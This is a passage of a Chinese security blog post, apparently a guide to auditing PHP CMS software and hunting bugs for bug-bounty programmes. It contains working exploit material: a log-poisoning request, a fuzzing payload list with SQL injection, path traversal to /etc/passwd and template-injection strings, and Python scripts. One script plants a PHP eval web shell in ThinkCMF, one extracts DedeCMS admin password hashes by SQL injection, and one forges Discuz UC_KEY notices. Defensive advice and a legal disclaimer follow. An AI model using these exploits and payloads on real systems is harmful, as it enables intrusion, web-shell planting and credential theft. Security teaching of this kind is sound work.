+<p><strong>缓存写入利用</strong>：缓存文件多为PHP数组格式（<code>/cache</code>或<code>/data</code>目录），构造恶意缓存值可写入可执行代码。</p>
+<p><strong>日志文件利用</strong>：构造含PHP代码的URL触发日志记录，若日志为<code>.php</code>后缀则getshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?s=&lt;?php phpinfo();?&gt; HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><strong>定时任务</strong>：后台创建计划任务指定远程脚本，实现远程文件包含执行。</p>
+<hr>
+<h2 id="八、插件与主题漏洞模式"><a href="#八、插件与主题漏洞模式" class="headerlink" title="八、插件与主题漏洞模式"></a>八、插件与主题漏洞模式</h2><p>插件是安全薄弱环节——开发者水平参差、审核不规范、更新不活跃。审计流程：</p>
+<ol>
+<li>定位插件入口文件（plugin.xml、index.php）</li>
+<li>追踪Hook&#x2F;Filter注册回调函数</li>
+<li>检查独立权限验证是否依赖全局检查</li>
+<li>寻找独立请求入口绕过主程序安全机制</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 典型不安全插件代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;download&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);  <span class="comment">// 未做权限检查 - 任意文件读取</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主题漏洞类型：<code>include $_GET[&#39;tpl&#39;]</code>文件包含、路径穿越、存储型XSS、SSTI（模板引擎变量可控）。</p>
+<hr>
+<h2 id="九、SRC-CMS漏洞挖掘实战"><a href="#九、SRC-CMS漏洞挖掘实战" class="headerlink" title="九、SRC CMS漏洞挖掘实战"></a>九、SRC CMS漏洞挖掘实战</h2><h3 id="9-1-信息收集"><a href="#9-1-信息收集" class="headerlink" title="9.1 信息收集"></a>9.1 信息收集</h3><ul>
+<li><strong>Fingerprint识别</strong>：robots.txt、admin路径特征、meta标签、HTTP头识别CMS类型</li>
+<li><strong>版本探测</strong>：静态资源hash（CSS&#x2F;JS）、readme、changelog获取精确版本</li>
+<li><strong>插件枚举</strong>：<code>/plugins/</code>、<code>/zb_users/plugin/</code>等路径探测已安装插件</li>
+</ul>
+<h3 id="9-2-测试规范"><a href="#9-2-测试规范" class="headerlink" title="9.2 测试规范"></a>9.2 测试规范</h3><ul>
+<li>SQL注入使用时间盲注或MD5证明，避免update&#x2F;insert</li>
+<li>限定SRC授权范围，不越界</li>
+<li>不删除或修改任何生产数据</li>
+</ul>
+<h3 id="9-3-高效策略"><a href="#9-3-高效策略" class="headerlink" title="9.3 高效策略"></a>9.3 高效策略</h3><table>
+<thead>
+<tr>
+<th>策略</th>
+<th>效率</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>补丁对比（diff相邻版本定位修复点）</td>
+<td>高</td>
+</tr>
+<tr>
+<td>历史漏洞复测（已知漏洞补丁绕过分析）</td>
+<td>中高</td>
+</tr>
+<tr>
+<td>第三方组件（编辑器、文件管理器等）</td>
+<td>高</td>
+</tr>
+<tr>
+<td>功能点Fuzzing（遍历参数注入payload）</td>
+<td>中</td>
+</tr>
+<tr>
+<td>未授权接口扫描</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<h3 id="9-4-Fuzzing字典关键词"><a href="#9-4-Fuzzing字典关键词" class="headerlink" title="9.4 Fuzzing字典关键词"></a>9.4 Fuzzing字典关键词</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 文件类参数</span><br><span class="line">file, path, dir, folder, url, src, template, theme, include</span><br><span class="line"></span><br><span class="line"># 数据库类参数</span><br><span class="line">id, catid, uid, pid, order, sort, field, keyword</span><br><span class="line"></span><br><span class="line"># 执行类参数</span><br><span class="line">action, method, do, callback, function, class</span><br><span class="line"></span><br><span class="line"># 常用payload</span><br><span class="line">&#x27; and 1=1--  |  &#x27; union select 1,2,3--</span><br><span class="line">../../../../etc/passwd</span><br><span class="line">$&#123;@print(md5(1))&#125;  |  &#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、实战代码示例"><a href="#十、实战代码示例" class="headerlink" title="十、实战代码示例"></a>十、实战代码示例</h2><h3 id="ThinkCMF-缓存写入GetShell"><a href="#ThinkCMF-缓存写入GetShell" class="headerlink" title="ThinkCMF 缓存写入GetShell"></a>ThinkCMF 缓存写入GetShell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://target.com/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.post(target + <span class="string">&#x27;admin/public/login.html&#x27;</span>,</span><br><span class="line">       data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin123&#x27;</span>&#125;)</span><br><span class="line">s.post(target + <span class="string">&#x27;admin/theme/set_cache.html&#x27;</span>,</span><br><span class="line">       data=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;../upload/evil.php&#x27;</span>,</span><br><span class="line">             <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;target&#125;</span>upload/evil.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DedeCMS-变量覆盖利用链"><a href="#DedeCMS-变量覆盖利用链" class="headerlink" title="DedeCMS 变量覆盖利用链"></a>DedeCMS 变量覆盖利用链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖数据库前缀实现注入读出管理员密码</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;cfg_dbprefix&#x27;</span>: <span class="string">&quot;dede_&#x27; UNION SELECT 1,2,3,uname||0x3a||pwd FROM dede_admin#&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;http://target.com/plus/recommend.php&quot;</span>, params=params)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Discuz-UC-KEY-伪造通知"><a href="#Discuz-UC-KEY-伪造通知" class="headerlink" title="Discuz! UC_KEY 伪造通知"></a>Discuz! UC_KEY 伪造通知</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authcode</span>(<span class="params">s, op, key</span>):</span><br><span class="line">    <span class="comment"># 实现Discuz authcode加解密</span></span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># 具体实现略</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用已知UC_KEY伪造更新通知</span></span><br><span class="line">code = authcode(<span class="string">&#x27;action=updateapps&amp;appid=1&#x27;</span>, <span class="string">&#x27;ENCODE&#x27;</span>, UC_KEY)</span><br><span class="line">requests.get(<span class="string">f&#x27;http://target.com/api/uc.php?code=<span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十一、防御建议"><a href="#十一、防御建议" class="headerlink" title="十一、防御建议"></a>十一、防御建议</h2><p><strong>开发层面</strong>：</p>
+<ul>
+<li>统一输入过滤入口，参数化查询（PDO prepared statements）</li>
+<li>文件路径使用白名单 + basename() 过滤</li>
+<li>模板引擎关闭危险函数（Smarty <code>{php}</code> 标签）</li>
+<li>上传双层校验：内容检测 + 扩展名白名单</li>
+<li>关键操作增加CSRF Token和二次确认</li>
+</ul>
+<p><strong>运维层面</strong>：</p>
+<ul>
+<li>及时更新CMS及插件，删除或限制访问 <code>/install/</code></li>
+<li>后台使用自定义路径配合IP白名单</li>
+<li>严格配置文件权限，防 <code>config.php</code> 被读取</li>
+<li>部署WAF作为最后防线</li>
+</ul>
+<hr>
+<h2 id="十二、免责声明"><a href="#十二、免责声明" class="headerlink" title="十二、免责声明"></a>十二、免责声明</h2><p><strong>本文所述技术仅供安全研究与授权测试使用。</strong></p>
+<ul>
+<li>未经授权对目标系统进行渗透测试属于违法行为</li>
+<li>使用者须遵守《中华人民共和国网络安全法》及相关法律法规</li>
+<li>因滥用本文技术导致的一切法律后果由使用者自行承担</li>
+<li>在SRC平台进行漏洞挖掘时，请严格遵守平台测试规范与授权范围</li>
+</ul>
+<p>学习攻击技术的目的是为了更好防御。希望读者通过理解攻击面，提升自身安全防护能力。</p>
+<hr>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li>ThinkCMF官方文档：<a target="_blank" rel="noopener" href="https://www.thinkcmf.com/doc">https://www.thinkcmf.com/doc</a></li>
+<li>Z-BlogPHP开发文档：<a target="_blank" rel="noopener" href="https://docs.zblogcn.com/">https://docs.zblogcn.com/</a></li>
+<li>Discuz!技术文库：<a target="_blank" rel="noopener" href="https://open.discuz.net/">https://open.discuz.net/</a></li>
+<li>OWASP Top 10：<a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></li>
+<li>《PHP代码审计实战》—— 代码审计入门推荐</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Deserialization-fastjson/" rel="prev" title="Fastjson漏洞从入门到精通">
+                  <i class="fa fa-angle-left"></i> Fastjson漏洞从入门到精通
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/HTTP-request-smuggling/" rel="next" title="HTTP请求走私攻击">
+                  HTTP请求走私攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
